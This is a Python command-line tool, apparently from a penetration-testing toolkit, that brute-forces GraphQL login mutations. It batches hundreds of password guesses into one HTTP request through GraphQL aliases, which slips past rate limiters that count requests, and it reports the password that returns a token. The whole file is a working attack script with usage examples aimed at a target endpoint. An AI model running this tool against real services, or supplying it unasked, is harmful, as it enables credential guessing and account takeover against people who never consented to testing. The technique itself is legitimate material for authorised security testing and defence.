#!/usr/bin/env python3
"""
alias_brute.py — GraphQL alias-based brute-force for rate limit bypass.

GraphQL aliases let you run the same field multiple times with different arguments
in a single HTTP request:

    mutation {
      bruteforce0: login(input: {username: "carlos", password: "123456"}) { token }
      bruteforce1: login(input: {username: "carlos", password: "password"}) { token }
      ...
    }

A rate limiter that counts HTTP requests will see only one request, not hundreds.
Detection: the first alias whose success field is non-null is flagged as the hit.
"""

import json
import os
import sys
import argparse
from typing import List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    import requests
except ImportError:
    print("[!] 'requests' library required. Install with: pip install requests",
          file=sys.stderr)
    sys.exit(1)

from core.http import build_headers
from core.output import GREEN, RED, YELLOW, CYAN, RESET


def build_alias_payload(field: str,
                        arg_user: str,
                        arg_pass: str,
                        username: str,
                        passwords: List[str],
                        success_fields: List[str],
                        operation: str = "mutation",
                        use_input_wrapper: bool = True) -> str:
    """Build a GraphQL document with one alias per password entry."""
    selection = " ".join(success_fields) if success_fields else "__typename"
    aliases = []
    for i, pw in enumerate(passwords):
        escaped_user = json.dumps(username)
        escaped_pass = json.dumps(pw)
        if use_input_wrapper:
            args_str = f"input: {{{arg_user}: {escaped_user}, {arg_pass}: {escaped_pass}}}"
        else:
            args_str = f"{arg_user}: {escaped_user}, {arg_pass}: {escaped_pass}"
        aliases.append(
            f"  bruteforce{i}: {field}({args_str}) {{ {selection} }}"
        )
    return f"{operation} {{\n" + "\n".join(aliases) + "\n}"


def send_batch(url: str, headers: dict, query: str, timeout: int = 30) -> Optional[requests.Response]:
    try:
        return requests.post(url, headers=headers, json={"query": query}, timeout=timeout)
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Request error: {e}", file=sys.stderr)
        return None


def find_success(response_data: dict,
                 batch_offset: int,
                 passwords: List[str],
                 success_field: str) -> Tuple[Optional[int], Optional[str], Optional[str]]:
    """Scan alias responses for a non-null success_field.

    Returns (alias_index, password, value) or (None, None, None).
    """
    if not isinstance(response_data, dict):
        return None, None, None
    data = response_data.get("data") or {}
    if not isinstance(data, dict):
        return None, None, None

    for alias_key, alias_data in data.items():
        if not alias_key.startswith("bruteforce"):
            continue
        try:
            i = int(alias_key[len("bruteforce"):])
        except ValueError:
            continue
        if not isinstance(alias_data, dict):
            continue
        value = alias_data.get(success_field)
        if value is not None:
            pw_index = batch_offset + i
            if pw_index < len(passwords):
                return i, passwords[pw_index], str(value)
    return None, None, None


def main():
    parser = argparse.ArgumentParser(
        description="GraphQL alias brute-force — bypass rate limiting via alias batching",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 alias_brute/alias_brute.py https://target.com/graphql \\\n"
            "    --field login --username carlos --wordlist passwords.txt\n\n"
            "  # Flat args (no 'input' wrapper):\n"
            "  python3 alias_brute/alias_brute.py https://target.com/graphql \\\n"
            "    --field login --username carlos --wordlist passwords.txt --no-input-wrapper\n"
        ),
    )
    parser.add_argument("endpoint", help="GraphQL endpoint URL")
    parser.add_argument("--field", required=True,
                        help="Mutation/query field to target (e.g. login)")
    parser.add_argument("--arg-user", default="username",
                        help="Username argument name (default: username)")
    parser.add_argument("--arg-pass", default="password",
                        help="Password argument name (default: password)")
    parser.add_argument("--username", required=True,
                        help="Username value for all attempts")
    parser.add_argument("--wordlist", required=True,
                        help="Wordlist file — one password per line")
    parser.add_argument("--success-field", default="token",
                        help="Field to check for non-null value to detect success (default: token)")
    parser.add_argument("--operation", default="mutation",
                        choices=["mutation", "query"],
                        help="GraphQL operation type (default: mutation)")
    parser.add_argument("--batch-size", type=int, default=100,
                        help="Aliases per HTTP request (default: 100)")
    parser.add_argument("--no-input-wrapper", dest="input_wrapper",
                        action="store_false",
                        help="Use flat args instead of 'input: {...}' wrapper")
    parser.set_defaults(input_wrapper=True)
    parser.add_argument("-H", "--header", action="append", default=[],
                        metavar="Name: Value",
                        help="HTTP header (repeatable)")
    parser.add_argument("--cookie", metavar="FILE", help="Cookie file (one line)")
    parser.add_argument("--timeout", type=int, default=30,
                        help="Request timeout in seconds (default: 30)")
    parser.add_argument("--verbose", action="store_true",
                        help="Print the generated payload before each batch")
    args = parser.parse_args()

    # --- Validate ---
    if not 1 <= args.batch_size <= 1000:
        print("[!] --batch-size must be between 1 and 1000.", file=sys.stderr)
        sys.exit(1)

    if not os.path.isfile(args.wordlist):
        print(f"[!] Wordlist not found: {args.wordlist!r}", file=sys.stderr)
        sys.exit(1)

    if args.cookie and not os.path.isfile(args.cookie):
        print(f"[!] Cookie file not found: {args.cookie!r}", file=sys.stderr)
        sys.exit(1)

    with open(args.wordlist, "r", encoding="utf-8", errors="replace") as f:
        passwords = [line.rstrip("\n\r") for line in f if line.strip()]

    if not passwords:
        print("[!] Wordlist is empty.", file=sys.stderr)
        sys.exit(1)

    headers = build_headers(args.header, args.cookie)
    success_fields = [args.success_field]

    total = len(passwords)
    batch_size = args.batch_size
    num_batches = (total + batch_size - 1) // batch_size
    wrapper_note = "input: {...}" if args.input_wrapper else "flat args"

    print(f"[*] Target:       {args.endpoint}")
    print(f"[*] Operation:    {args.operation} {{ {args.field}({wrapper_note}) }}")
    print(f"[*] Username:     {args.username}")
    print(f"[*] Wordlist:     {total} passwords")
    print(f"[*] Batch size:   {batch_size} aliases/request → {num_batches} request(s)")
    print(f"[*] Success on:   non-null '{args.success_field}'")
    print()

    for batch_num in range(num_batches):
        offset = batch_num * batch_size
        batch_passwords = passwords[offset:offset + batch_size]

        query = build_alias_payload(
            args.field, args.arg_user, args.arg_pass,
            args.username, batch_passwords,
            success_fields, args.operation, args.input_wrapper,
        )

        if args.verbose:
            print(f"--- Payload (batch {batch_num + 1}/{num_batches}) ---")
            print(query)
            print("---")

        print(
            f"[*] Batch {batch_num + 1}/{num_batches} "
            f"(#{offset + 1}–#{offset + len(batch_passwords)})...",
            end="", flush=True,
        )

        resp = send_batch(args.endpoint, headers, query, timeout=args.timeout)
        if resp is None:
            print(f" {RED}FAILED{RESET}")
            continue

        print(f" HTTP {resp.status_code}", end="")

        try:
            data = resp.json()
        except ValueError:
            print(" (non-JSON response)")
            continue

        alias_idx, matched_pw, matched_val = find_success(
            data, offset, passwords, args.success_field
        )

        if matched_pw is not None:
            print()
            print(f"\n{GREEN}[+] SUCCESS{RESET} — alias bruteforce{alias_idx}")
            print(f"    Password:  {YELLOW}{matched_pw}{RESET}")
            print(f"    {args.success_field}: {matched_val}")
            return

        errors = (data.get("errors") or []) if isinstance(data, dict) else []
        if errors and isinstance(errors[0], dict):
            first_msg = errors[0].get("message", "")[:80]
            print(f" — {first_msg}")
        else:
            print(" (no hit)")

    print(f"\n{RED}[-] No valid credentials found across {total} attempt(s).{RESET}")


if __name__ == "__main__":
    main()
